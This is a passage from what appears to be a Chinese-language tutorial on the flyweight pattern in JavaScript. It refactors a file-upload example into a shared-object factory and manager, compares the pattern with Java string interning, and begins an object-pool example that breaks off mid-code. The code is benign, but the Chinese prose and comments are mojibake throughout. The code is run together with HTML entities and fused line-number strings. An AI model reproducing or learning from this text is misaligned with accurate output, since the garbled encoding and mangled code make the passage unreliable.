è¿™ä¸¤ç§ã€‚ä¸è®ºæ˜¯æ’ä»¶ä¸Šä¼ ï¼Œè¿˜æ˜¯ Flash ä¸Šä¼ ï¼ŒåŽŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå½“ç”¨æˆ·é€‰æ‹©äº†æ–‡ä»¶ä¹‹åŽï¼Œæ’ä»¶å’Œ Flash éƒ½ä¼šé€šçŸ¥è°ƒç”¨ Window ä¸‹çš„ä¸€ä¸ªå…¨å±€ JavaScript å‡½æ•°ï¼Œå®ƒçš„åå­—æ˜¯startUploadï¼Œç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶åˆ—è¡¨è¢«ç»„åˆæˆä¸€ä¸ªæ•°ç»„ files å¡žè¿›è¯¥å‡½æ•°çš„å‚æ•°åˆ—è¡¨é‡Œï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233var id = 0;window.startUpload = function(uploadType,files)&#123; // uploadType åŒºåˆ†æ˜¯æŽ§ä»¶è¿˜æ˜¯ flash for(var i=0,file;file=files[i++];)&#123; var uploadObj = new Upload(uploadType,file.fileName,file.fileSize); uploadObj.init(id++); // ç»™ upload å¯¹è±¡è®¾ç½®ä¸€ä¸ªå”¯ä¸€çš„ id &#125;&#125;var Upload = function(uploadType,fileName,fileSize)&#123; this.uploadType = uploadType; this.fileName = fileName; this.fileSize = fileSize; this.dom = null;&#125;Upload.prototype.init = function(id)&#123; var that = this; this.id = id; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt;æ–‡ä»¶åç§°:'+ this.fileName +', æ–‡ä»¶å¤§å°: '+this.fileSize +'&lt;/span&gt;' + '&lt;button class="delFile"&gt;åˆ é™¤&lt;/button&gt;'; this.dom.querySelector('.delFile').onclick = function()&#123; that.delFile(); &#125;; document.body.appendChild(this.dom);&#125;Upload.prototype.delFile = function()&#123; if(this.fileSize &lt; 3000)&#123; return this.dom.parentNode.removeChild(this.dom); &#125; if(window.confirm('ç¡®å®šåˆ é™¤è¯¥æ–‡ä»¶å—ï¼Ÿ'+this.fileName))&#123; return this.dom.parentNode.removeChild(this.dom); &#125;&#125; æŽ¥ä¸‹æ¥åˆ†åˆ«åˆ›å»º 3 ä¸ªæ’ä»¶ä¸Šä¼ å¯¹è±¡å’Œä¸‰ä¸ª Flash ä¸Šä¼ å¯¹è±¡ï¼š 12345678910startUpload('plugin',[ &#123;fileName: '1.txt', fileSize: 1000 &#125;, &#123;fileName: '2.html', fileSize: 3000 &#125;, &#123;fileName: '3.txt', fileSize: 5000 &#125;, ]); startUpload('flash',[ &#123;fileName: '4.txt', fileSize: 1000 &#125;, &#123;fileName: '5.html', fileSize: 3000 &#125;, &#123;fileName: '6.txt', fileSize: 5000 &#125;, ]); äº«å…ƒæ¨¡å¼é‡æž„æ–‡ä»¶ä¸Šä¼ ä¸Šä¸€èŠ‚çš„ä»£ç æ˜¯ç¬¬ä¸€ç‰ˆæ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨è¿™æ®µä»£ç ä¸­æœ‰å¤šå°‘ä¸ªéœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå°±ä¸€å…±åˆ›å»ºäº†å¤šå°‘ä¸ª upload å¯¹è±¡ï¼Œä¸‹é¢ç”¨äº«å…ƒæ¨¡å¼é‡æž„å®ƒã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤æ’ä»¶ç±»åž‹ uploadType æ˜¯å†…éƒ¨çŠ¶æ€ï¼Œé‚£ä¸ºä»€ä¹ˆå•å• uploadType æ˜¯å†…éƒ¨çŠ¶æ€ï¼Œå‰é¢è¯´è¿‡ï¼Œåˆ’åˆ†å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€çš„å…³é”®æ˜¯ä¸»è¦ä¸‹é¢å‡ ç‚¹ï¼š å†…éƒ¨çŠ¶æ€å‚¨å­˜äºŽå¯¹è±¡å†…éƒ¨ã€‚ å†…éƒ¨çŠ¶æ€å¯ä»¥è¢«ä¸€äº›å¯¹è±¡å…±äº«ã€‚ å†…éƒ¨çŠ¶æ€ç‹¬ç«‹äºŽå…·ä½“çš„åœºæ™¯ï¼Œé€šå¸¸ä¸ä¼šæ”¹å˜ã€‚ å¤–éƒ¨çŠ¶æ€å–å†³äºŽå…·ä½“çš„åœºæ™¯å¹¶æ ¹æ®åœºæ™¯è€Œå˜åŒ–å¤–éƒ¨çŠ¶æ€ä¸èƒ½è¢«å…±äº«ã€‚ åœ¨æ–‡ä»¶ä¸Šä¼ çš„ä¾‹å­ä¸­ï¼Œupload å¯¹è±¡å¿…é¡»ä¾èµ– uploadType å±žæ€§æ‰èƒ½å·¥ä½œï¼Œè¿™æ˜¯å› ä¸ºæ’ä»¶ä¸Šä¼ ã€Flash ä¸Šä¼ ã€è¡¨å•ä¸Šä¼ çš„å®žé™…å·¥ä½œåŽŸç†æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œå®ƒä»¬å„è‡ªè°ƒç”¨çš„æŽ¥å£ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¿…é¡»åœ¨å¯¹è±¡åˆ›å»ºä¹‹åˆå°±æ˜Žç¡®å®ƒæ˜¯ä»€ä¹ˆç±»åž‹çš„æ’ä»¶ï¼Œæ‰å¯ä»¥åœ¨ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œè®©å®ƒä»¬åˆ†åˆ«è°ƒç”¨å„è‡ªçš„ startã€pauseã€cancelã€del ç­‰æ–¹æ³•ã€‚ å®žé™…ä¸Šåœ¨å¾®äº‘çš„çœŸå®žä»£ç ä¸­ï¼Œè™½ç„¶æ’ä»¶å’Œ Flash ä¸Šä¼ å¯¹è±¡æœ€ç»ˆåˆ›å»ºè‡ªä¸€ä¸ªå¤§çš„å·¥åŽ‚ç±»ï¼Œä½†å®ƒä»¬å®žé™…ä¸Šæ ¹æ® uploadType å€¼çš„ä¸åŒï¼Œåˆ†åˆ«æ˜¯æ¥è‡ªäºŽä¸¤ä¸ªä¸åŒç±»çš„å¯¹è±¡ã€‚ ä¸€æ—¦æ˜Žç¡®äº† uploadTypeï¼Œæ— è®ºæˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆæ–¹å¼ä¸Šä¼ ï¼Œè¿™ä¸ªä¸Šä¼ å¯¹è±¡éƒ½æ˜¯å¯ä»¥è¢«ä»»ä½•æ–‡ä»¶å…±ç”¨çš„ã€‚è€Œ fileName å’Œ fileSize æ˜¯æ ¹æ®åœºæ™¯è€Œå˜åŒ–çš„ï¼Œæ¯ä¸ªæ–‡ä»¶çš„ fileName å’Œ fileSize éƒ½ä¸ä¸€æ ·ï¼ŒfileName å’Œ fileSize æ²¡æœ‰åŠžæ³•è¢«å…±äº«ï¼Œå®ƒä»¬åªèƒ½è¢«åˆ’åˆ†ä¸ºå¤–éƒ¨çŠ¶æ€ã€‚ å‰¥ç¦»å¤–éƒ¨çŠ¶æ€æ˜Žç¡®äº† uploadType ä½œä¸ºå†…éƒ¨çŠ¶æ€ä¹‹åŽï¼Œæˆ‘ä»¬å†æŠŠå…¶ä»–å¤–éƒ¨çŠ¶æ€ä»Žæž„é€ å‡½æ•°ä¸­æŠ½ç¦»å‡ºæ¥ï¼ŒUpload æž„é€ å‡½æ•°ä¸­åªä¿ç•™ uploadType å‚æ•°ï¼š 1234567891011121314var Upload = function(uploadType)&#123; this.uploadType = uploadType;&#125;// init å‡½æ•°ä¹Ÿä¸å†éœ€è¦äº†ï¼Œå› ä¸º upload å¯¹è±¡åˆå§‹åŒ–çš„å·¥ä½œè¢«æ”¾åœ¨äº† uploadManager.add å‡½æ•°ä¸­ï¼Œä¸‹é¢å®šä¹‰çš„æ˜¯ åˆ é™¤å‡½æ•°Upload.prototype.delFile = function(id)&#123; // å¼€å§‹åˆ é™¤æ–‡ä»¶ä¹‹å‰ï¼Œéœ€è¦è¯»å–æ–‡ä»¶çš„å®žé™…å¤§å°ï¼Œè€Œæ–‡ä»¶çš„å®žé™…å¤§å°è¢«å­˜å‚¨åœ¨å¤–éƒ¨ç®¡ç†å™¨ uploadManager ä¸­ï¼Œè¿™é‡Œéœ€è¦ setExternalState æ–¹æ³•ç»™å…±äº«å¯¹è±¡è®¾ç½®æ­£ç¡®çš„ fileSizeã€‚è¿™é‡Œè¡¨ç¤ºæŠŠå½“å‰ id å¯¹åº”çš„å¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€éƒ½ç»„è£…åˆ°å…±äº«å¯¹è±¡ä¸­ uploadManager.setExternalState(id,this); if(this.fileSize &lt; 3000)&#123; return this.dom.parentNode.removeChild(this.dom); &#125; if(window.confirm('ç¡®å®šåˆ é™¤è¯¥æ–‡ä»¶å—ï¼Ÿ'+this.fileName))&#123; return this.dom.parentNode.removeChild(this.dom); &#125; &#125; å·¥åŽ‚è¿›è¡Œå¯¹è±¡å®žä¾‹åŒ–æŽ¥ä¸‹é‡Œå®šä¹‰ä¸€ä¸ªå·¥åŽ‚æ¥åˆ›å»º upload å¯¹è±¡ï¼Œå¦‚æžœæŸç§å†…éƒ¨çŠ¶æ€å¯¹åº”çš„å…±äº«å¯¹è±¡å·²ç»è¢«åˆ›å»ºè¿‡äº†ï¼Œé‚£ä¹ˆç›´æŽ¥è¿”å›žè¿™ä¸ªå¯¹è±¡ï¼Œå¦åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼š 1234567891011var UploadFactory = (function()&#123; var createdFlyWeightObjs = &#123;&#125;; return&#123; create:function(uploadType)&#123; if(createdFlyWeightObjs[uploadType])&#123; return createdFlyWeightObjs[uploadType] &#125; return createdFlyWeightObjs[uploadType] = new Upload(uploadType); &#125; &#125;&#125;)() ç®¡ç†å™¨å°è£…å¤–éƒ¨çŠ¶æ€å®Œå–„å‰é¢æåˆ°çš„ uploadManager å¯¹è±¡ï¼Œå®ƒè´Ÿè´£å‘ UploadFactory æäº¤åˆ›å»ºå¯¹è±¡çš„è¯·æ±‚ï¼Œå¹¶ç”¨ä¸€ä¸ª uploadDatabase å¯¹è±¡ä¿å­˜æ‰€æœ‰ upload å¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€ï¼Œä»¥ä¾¿åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ç»™ upload å…±äº«å¯¹è±¡è®¾ç½®å¤–éƒ¨çŠ¶æ€ï¼š 1234567891011121314151617181920212223242526var uploadManager = (function()&#123; var uploadDatabase = &#123;&#125;; return&#123; add:function(id,uploadType,fileName,fileSize)&#123; var flyWeightObj = UploadFactory.create(uploadType); var dom = document.createElement('div'); dom.innerHTML = '&lt;span&gt;æ–‡ä»¶åç§°:'+ fileName +', æ–‡ä»¶å¤§å°: '+fileSize +'&lt;/span&gt;' + '&lt;button class="delFile"&gt;åˆ é™¤&lt;/button&gt;'; dom.querySelector('.delFile').onclick = function()&#123; flyWeightObj.delFile(id); &#125;; document.body.appendChild(dom); uploadDatabase[id] = &#123; fileName:fileName, fileSize:fileSize, dom:dom &#125;; return flyWeightObj; &#125;, setExternalState:function(id,flyWeightObj)&#123; var uploadData = uploadDatabase[id]; for(var i in uploadData)&#123; flyWeightObj[i] = uploadData[i] &#125; &#125; &#125;&#125;)(); ç„¶åŽæ˜¯å¼€å§‹è§¦å‘ä¸Šä¼ åŠ¨ä½œçš„ startUploadå‡½æ•°ï¼š 123456var id = 0;window.startUpload = function(uploadType,files)&#123; for(var i=0,file;file=files[i++];)&#123; var uploadObj = uploadManager.add(++id,uploadType,file.fileName,file.fileSize); &#125;&#125; æœ€åŽæ˜¯æµ‹è¯•æ—¶é—´ï¼Œè¿è¡Œä¸‹é¢çš„ä»£ç åŽï¼Œå¯ä»¥å‘çŽ°è¿è¡Œç»“æžœè·Ÿäº«å…ƒæ¨¡å¼æ˜¯ä¸€æ ·çš„ï¼š 12345678910startUpload('plugin',[ &#123;fileName: '1.txt', fileSize: 1000 &#125;, &#123;fileName: '2.html', fileSize: 3000 &#125;, &#123;fileName: '3.txt', fileSize: 5000 &#125;, ]); startUpload('flash',[ &#123;fileName: '4.txt', fileSize: 1000 &#125;, &#123;fileName: '5.html', fileSize: 3000 &#125;, &#123;fileName: '6.txt', fileSize: 5000 &#125;, ]); äº«å…ƒæ¨¡å¼é‡æž„ä¹‹å‰çš„ä»£ç ä¸€å…±åˆ›å»ºäº† 6 ä¸ª upload å¯¹è±¡ï¼Œè€Œé€šè¿‡äº«å…ƒæ¨¡å¼é‡æž„ä¹‹åŽï¼Œå¯¹è±¡çš„æ•°é‡å‡å°‘ä¸º 2 ä¸ªï¼Œå°±ç®—çŽ°åœ¨åŒæ—¶ä¸Šä¼  2000 ä¸ªæ–‡ä»¶ï¼Œéœ€è¦åˆ›å»ºçš„ upload å¯¹è±¡æ•°é‡ä¾æ—§æ˜¯ 2ã€‚ äº«å…ƒæ¨¡å¼ çš„é€‚ç”¨æ€§äº«å…ƒæ¨¡å¼æ˜¯ä¸€ç§å¾ˆå¥½çš„æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆï¼Œä½†å®ƒä¹Ÿå¸¦æ¥äº†ä¸€äº›å¤æ‚æ€§çš„é—®é¢˜ï¼Œä»Žå‰é¢ä¸¤ç»„ä»£ç çš„æ¯”è¾ƒå¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨äº†äº«å…ƒæ¨¡å¼ä¹‹åŽï¼Œæˆ‘ä»¬éœ€è¦åˆ†åˆ«ç»´æŠ¤å¤šä¸€ä¸ª factory å¯¹è±¡å’Œ ä¸€ä¸ª manager å¯¹è±¡ï¼Œåœ¨å¤§éƒ¨åˆ†ä¸å¿…è¦ä½¿ç”¨äº«å…ƒæ¨¡å¼çš„çŽ¯å¢ƒä¸‹ï¼Œè¿™äº›å¼€é”€æ˜¯å¯ä»¥é¿å…çš„ã€‚ äº«å…ƒæ¨¡å¼å¸¦æ¥çš„å¥½å¤„å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºŽå¦‚ä½•ä½¿ç”¨ä»¥åŠä½•æ—¶ä½¿ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸‹æƒ…å†µå‘ç”Ÿçš„æ—¶å€™å¯ä»¥ä½¿ç”¨äº«å…ƒæ¨¡å¼ã€‚ ä¸€ä¸ªç¨‹åºä¸­ä½¿ç”¨äº†å¤§é‡çš„ç›¸ä¼¼å¯¹è±¡ ç”±äºŽä½¿ç”¨äº†å¤§é‡å¯¹è±¡ï¼Œé€ æˆå¾ˆå¤§çš„å†…å­˜å¼€é”€ å¯¹è±¡çš„å¤§å¤šæ•°çŠ¶æ€éƒ½å¯ä»¥å˜ä¸ºå¤–éƒ¨çŠ¶æ€ å‰¥ç¦»å‡ºå¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€ä¹‹åŽï¼Œå¯ä»¥ç”¨ç›¸å¯¹æ¯”è¾ƒå°‘çš„å…±äº«å¯¹è±¡å–ä»£å¤§é‡å¯¹è±¡ å†è°ˆå†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€äº«å…ƒæ¨¡å¼çš„å…³é”®æ˜¯æŠŠå†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€åˆ†ç¦»å¼€æ¥ï¼Œæœ‰å¤šå°‘ä¸­å†…éƒ¨çŠ¶æ€çš„ç»„åˆï¼Œç³»ç»Ÿä¾¿æœ‰æœ€å¤šå¤šå°‘ä¸ªå…±äº«å¯¹è±¡ï¼Œè€Œå¤–éƒ¨çŠ¶æ€å­˜å‚¨åœ¨å…±äº«å¯¹è±¡çš„å¤–éƒ¨ï¼Œåœ¨å¿…è¦æ—¶è¢«ä¼ å…¥å…±äº«å¯¹è±¡æ¥ç»„è£…æˆä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡ã€‚çŽ°åœ¨è€ƒè™‘ä¸¤ç§æžç«¯çš„æƒ…å†µï¼Œå³å¯¹è±¡æ²¡æœ‰å¤–éƒ¨çŠ¶æ€å’Œæ²¡æœ‰å†…éƒ¨çŠ¶æ€çš„æ—¶å€™ã€‚ æ²¡æœ‰å†…éƒ¨çŠ¶æ€çš„äº«å…ƒåœ¨æ–‡ä»¶ä¸Šä¼ çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è¿›è¡Œè¿‡æ’ä»¶è°ƒç”¨å’Œ Flash è°ƒç”¨ï¼Œå°± startUpload(&#39;plugin&#39;,[]) å’Œ startUpload(flash,[])ï¼Œå¯¼è‡´ç¨‹åºä¸­åˆ›å»ºäº†å†…éƒ¨çŠ¶æ€ä¸åŒçš„ä¸¤ä¸ªå…±äº«å¯¹è±¡ã€‚å¾ˆå¤šç½‘ç›˜éƒ½æä¾›äº†æžé€Ÿä¸Šä¼ ï¼ˆæŽ§ä»¶ï¼‰å’Œæ™®é€šä¸Šä¼ ï¼ˆFlashï¼‰ä¸¤ç§æ¨¡å¼ï¼Œå¦‚æžœæžé€Ÿä¸Šä¼ ä¸å¥½ä½¿çš„è¯ï¼Œç”¨æˆ·å¯ä»¥éšæ—¶åˆ‡æ¢åˆ°æ™®é€šæ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œç¡®å®žæ˜¯éœ€è¦åŒæ—¶å­˜åœ¨ä¸¤ä¸ªä¸åŒçš„ upload å…±äº«å¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨ä¸€å¼€å§‹å°±è‡ªæˆ‘åˆ¤æ–­æµè§ˆå™¨å¯ä»¥æ”¯æŒä»€ä¹ˆæ’ä»¶ï¼Œå°±ç”¨ä»€ä¹ˆæ’ä»¶ä¸Šä¼ ã€‚ ä½†ä¸æ˜¯æ¯ä¸ªç½‘ç«™éƒ½è¦åšå¾—è¿™ä¹ˆå¤æ‚ï¼Œå¾ˆå¤šå°çš„ç½‘ç«™åªæ”¯æŒå•ä¸€çš„ä¸Šä¼ æ–¹å¼ï¼Œå¦‚æžœä¸è€ƒè™‘æžé€Ÿä¸Šä¼ å’Œæ™®é€šä¸Šä¼ ä¹‹é—´çš„åˆ‡æ¢ï¼Œè¿™æ„å‘³ç€ä¹‹å‰çš„ä»£ç ä¸­ä½œä¸ºå†…éƒ¨çŠ¶æ€çš„ uploadType å±žæ€§æ˜¯å¯ä»¥åˆ é™¤çš„ã€‚ åœ¨ç»§ç»­ä½¿ç”¨äº«å…ƒæ¨¡å¼çš„å‰æä¸‹ï¼Œæž„é€ å‡½æ•° upload å°±å˜æˆäº†æ— å‚æ•°çš„å½¢å¼ï¼š 1var upload = function()&#123;&#125; å…¶ä»–å±žæ€§å¦‚ fileNameï¼ŒfileSizeï¼Œdom ä¾ç„¶å¯ä»¥ä½œä¸ºå¤–éƒ¨çŠ¶æ€ä¿å­˜åœ¨å…±äº«å¯¹è±¡çš„å¤–éƒ¨ã€‚åœ¨ uploadType ä½œä¸ºå†…éƒ¨çŠ¶æ€çš„æ—¶å€™ï¼Œå®ƒå¯èƒ½ä¸ºç©ºé—´ï¼Œä¹Ÿå¯èƒ½ä¸º Flashï¼Œæ‰€ä»¥å½“æ—¶æœ€å¤šå¯ä»¥ç»„åˆæˆä¸¤ä¸ªå…±äº«å¯¹è±¡ã€‚è€ŒçŽ°åœ¨æ²¡æœ‰äº†å†…éƒ¨çŠ¶æ€ï¼Œè¿™æ„å‘³ç€åªéœ€è¦å”¯ä¸€çš„ä¸€ä¸ªå…±äº«å¯¹è±¡ã€‚æˆ‘ä»¬å¯¹ä»£ç è¿›è¡Œæ”¹å†™ï¼š 1234567891011var UploadFactory = (function()&#123; var uploadObj; return&#123; create:function()&#123; if(uploadObj)&#123; return uploadObj &#125; return uploadObj = new Upload(); &#125; &#125;&#125;)() ç®¡ç†å™¨éƒ¨åˆ†çš„ä»£ç ä¸éœ€è¦æ”¹åŠ¨ï¼Œè¿˜æ˜¯è´Ÿè´£å‰¥ç¦»å’Œç»„è£…å¤–éƒ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“å¯¹è±¡æ²¡æœ‰å†…éƒ¨çŠ¶æ€çš„æ—¶å€™ï¼Œç”Ÿäº§å…±äº«å¯¹è±¡çš„å·¥åŽ‚å®žé™…ä¸Šå˜æˆäº†ä¸€ä¸ªå•ä¾‹å·¥åŽ‚ï¼Œè™½ç„¶è¿™æ—¶å€™çš„å…±äº«å¯¹è±¡æ²¡æœ‰å†…éƒ¨çŠ¶æ€çš„åŒºåˆ†ï¼Œä½†è¿˜æ˜¯æœ‰å‰¥ç¦»å¤–éƒ¨çŠ¶æ€çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¾ç„¶å€¾å‘äºŽç§°ä¹‹ä¸ºäº«å…ƒæ¨¡å¼ã€‚ æ²¡æœ‰å¤–éƒ¨çŠ¶æ€çš„äº«å…ƒç½‘ä¸Šè®¸å¤šèµ„æ–™ä¸­ï¼Œç»å¸¸æŠŠ Java æˆ–è€… C#çš„å­—ç¬¦ä¸²çœ‹æˆäº«å…ƒï¼Œè¿™ç§è¯´æ³•æ˜¯å¦æ­£ç¡®å‘¢ï¼Ÿæˆ‘ä»¬çœ‹çœ‹ä¸‹é¢è¿™æ®µ Java ä»£ç ï¼Œæ¥åˆ†æžä¸€ä¸‹ï¼š 1234567public class Test &#123; public static void main( String args[] )&#123; String a1 = new String( "a" ).intern(); String a2 = new String( "a" ).intern(); System.out.println( a1 == a2 ); // true &#125; &#125; åœ¨è¿™æ®µ Java ä»£ç é‡Œï¼Œåˆ†åˆ« new äº†ä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ a1 å’Œ a2ã€‚intern æ˜¯ä¸€ç§å¯¹è±¡æ± æŠ€æœ¯ï¼Œ new String(â€œaâ€).intern()çš„å«ä¹‰å¦‚ä¸‹ å¦‚æžœå€¼ä¸º a çš„å­—ç¬¦ä¸²å¯¹è±¡å·²ç»å­˜åœ¨äºŽå¯¹è±¡æ± ä¸­ï¼Œåˆ™è¿”å›žè¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨ åä¹‹ï¼Œå°†å­—ç¬¦ä¸² a çš„å¯¹è±¡æ·»åŠ è¿›å¯¹è±¡æ± ï¼Œå¹¶è¿”å›žè¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨ æ‰€ä»¥ a1 == a2 çš„ç»“æžœæ˜¯ trueï¼Œä½†è¿™å¹¶ä¸æ˜¯ä½¿ç”¨äº†äº«å…ƒæ¨¡å¼çš„ç»“æžœï¼Œäº«å…ƒæ¨¡å¼çš„å…³é”®æ˜¯åŒºåˆ«å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€ã€‚äº«å…ƒæ¨¡å¼çš„è¿‡ç¨‹æ˜¯å‰¥ç¦»å¤–éƒ¨çŠ¶æ€ï¼Œå¹¶æŠŠå¤–éƒ¨çŠ¶æ€ä¿å­˜åœ¨å…¶ä»–åœ°æ–¹ï¼Œåœ¨åˆé€‚çš„æ—¶åˆ»å†æŠŠå¤–éƒ¨çŠ¶æ€ç»„è£…è¿›å…±äº«å¯¹è±¡ã€‚è¿™é‡Œå¹¶æ²¡æœ‰å‰¥ç¦»å¤–éƒ¨çŠ¶æ€çš„è¿‡ç¨‹ï¼Œa1 å’Œ a2 æŒ‡å‘çš„å®Œå…¨å°±æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥å¦‚æžœæ²¡æœ‰å¤–éƒ¨çŠ¶æ€çš„åˆ†ç¦»ï¼Œå³ä½¿è¿™é‡Œä½¿ç”¨äº†å…±äº«çš„æŠ€æœ¯ï¼Œä½†å¹¶ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„äº«å…ƒæ¨¡å¼ã€‚ å¯¹è±¡æ± å¯¹è±¡æ± ç»´æŠ¤ä¸€ä¸ªè£…è½½ç©ºé—²å¯¹è±¡çš„æ± å­ï¼Œå¦‚æžœéœ€è¦å¯¹è±¡çš„æ—¶å€™ï¼Œä¸æ˜¯ç›´æŽ¥ newï¼Œè€Œæ˜¯è½¬ä»Žå¯¹è±¡æ± é‡ŒèŽ·å–ã€‚å¦‚æžœå¯¹è±¡æ± é‡Œæ²¡æœ‰ç©ºé—²å¯¹è±¡ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå½“èŽ·å–å‡ºçš„å¯¹è±¡å®Œæˆå®ƒçš„èŒè´£ä¹‹åŽï¼Œ å†è¿›å…¥æ± å­ç­‰å¾…è¢«ä¸‹æ¬¡èŽ·å–ã€‚ å¯¹è±¡æ± çš„åŽŸç†å¾ˆå¥½ç†è§£ï¼Œæ¯”å¦‚æˆ‘ä»¬ç»„äººæ‰‹ä¸€æœ¬ã€ŠJavaScript æƒå¨æŒ‡å—ã€‹ï¼Œä»ŽèŠ‚çº¦çš„è§’åº¦æ¥è®²ï¼Œè¿™å¹¶ä¸æ˜¯å¾ˆåˆ’ç®—ï¼Œå› ä¸ºå¤§éƒ¨åˆ†æ—¶é—´è¿™äº›ä¹¦éƒ½è¢«é—²ç½®åœ¨å„è‡ªçš„ä¹¦æž¶ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹å°±åªä¹°ä¸€æœ¬ï¼Œæˆ–è€…ä¸€èµ·å»ºç«‹ä¸€ä¸ªå°åž‹å›¾ä¹¦é¦†ï¼ˆå¯¹è±¡æ± ï¼‰ï¼Œéœ€è¦çœ‹ä¹¦çš„æ—¶å€™å°±ä»Žå›¾ä¹¦é¦†é‡Œå€Ÿï¼Œçœ‹å®Œäº†ä¹‹åŽå†æŠŠä¹¦è¿˜å›žå›¾ä¹¦é¦†ã€‚å¦‚æžœåŒæ—¶æœ‰ä¸‰ä¸ªäººè¦çœ‹è¿™æœ¬ä¹¦ï¼Œè€ŒçŽ°åœ¨å›¾ä¹¦é¦†é‡Œåªæœ‰ä¸¤æœ¬ï¼Œé‚£æˆ‘ä»¬å†é©¬ä¸ŠåŽ»ä¹¦åº—ä¹°ä¸€æœ¬æ”¾å…¥å›¾ä¹¦é¦†ã€‚ å¯¹è±¡æ± çš„æŠ€æœ¯çš„åº”ç”¨éžå¸¸å¹¿æ³›ï¼ŒHTTP è¿žæŽ¥æ± å’Œæ•°æ®åº“è¿žæŽ¥æ± éƒ½æ˜¯å…¶ä»£è¡¨åº”ç”¨ï¼Œåœ¨ Web å‰ç«¯å¼€å‘ä¸­ï¼Œå¯¹è±¡æ± ä½¿ç”¨æœ€å¤šçš„åœºæ™¯å¤§æ¦‚æ˜¯è·Ÿ DOM æœ‰å…³çš„æ“ä½œï¼Œå¾ˆå¤šç©ºé—´å’Œæ—¶é—´éƒ½æ¶ˆè€—åœ¨äº† DOM èŠ‚ç‚¹ä¸Šï¼Œå¦‚ä½•é¿å…é¢‘ç¹åœ°åˆ›å»ºå’Œåˆ é™¤ DOM èŠ‚ç‚¹å°±æˆäº†ä¸€ä¸ªæœ‰æ„ä¹‰çš„è¯é¢˜ã€‚ å¯¹è±¡æ± çš„å®žçŽ°å‡è®¾æˆ‘ä»¬åœ¨å¼€å‘ä¸€ä¸ªåœ°å›¾åº”ç”¨ï¼Œåœ°å›¾ä¸Šç»å¸¸ä¼šå‡ºçŽ°ä¸€äº›æ ‡å¿—åœ°åçš„å°æ°”æ³¡ï¼Œæˆ‘ä»¬å«å®ƒ toolTipã€‚ åœ¨æœç´¢æˆ‘å®¶é™„è¿‘åœ°å›¾çš„æ—¶å€™ï¼Œé¡µé¢é‡Œå‡ºçŽ°äº† 2 ä¸ªå°æ°”æ³¡ã€‚å½“æˆ‘å†æœç´¢é™„è¿‘çš„å…°å·žæ‹‰é¢é¦†æ—¶ï¼Œé¡µé¢ä¸­å‡ºçŽ°äº† 6 ä¸ªå°æ°”æ³¡ã€‚æŒ‰ç…§å¯¹è±¡æ± çš„æ€æƒ³ï¼Œåœ¨ç¬¬äºŒæ¬¡æœç´¢å¼€å§‹ä¹‹å‰ï¼Œå¹¶ä¸ä¼šæŠŠç¬¬ä¸€æ¬¡åˆ›å»ºçš„2 ä¸ªå°æ°”æ³¡åˆ é™¤æŽ‰ï¼Œè€Œæ˜¯æŠŠå®ƒä»¬æ”¾è¿›å¯¹è±¡æ± ã€‚è¿™æ ·åœ¨ç¬¬äºŒæ¬¡çš„æœç´¢ç»“æžœé¡µé¢é‡Œï¼Œæˆ‘ä»¬åªéœ€è¦å†åˆ›å»º 4 ä¸ªå°æ°”æ³¡è€Œä¸æ˜¯ 6 ä¸ªã€‚ å…ˆå®šä¹‰ä¸ªèŽ·å–å°æ°”æ³¡çš„å·¥åŽ‚ï¼Œä½œä¸ºå¯¹è±¡æ± çš„æ•°ç»„ç§°ä¸ºç§æœ‰å±žæ€§è¢«åŒ…å«åœ¨å·¥åŽ‚é—­åŒ…é‡Œï¼Œè¿™ä¸ªå·¥åŽ‚æœ‰ä¸¤ä¸ªæš´éœ²å¯¹å¤–çš„æ–¹æ³•ï¼Œcreate è¡¨ç¤ºèŽ·å–ä¸€ä¸ª div èŠ‚ç‚¹ï¼Œrecover è¡¨ç¤ºå›žæ”¶ä¸€ä¸ª div èŠ‚ç‚¹ï¼š 123456789101112131415161718var toolTipFactory = (function()&#123; var toolTipPool = []; // toolTip å¯¹è±¡æ±  return&#123; create:function()&#123; if(toolTipPool.length === 0)&#123; var div = document.createElement('div'); document.body.appendChild(div); return div; &#125;else&#123; return toolTipPool.shift(); // å¦‚æžœå¯¹è±¡æ± ä¸ä¸ºç©ºï¼Œåˆ™ä»Žå¯¹è±¡æ± 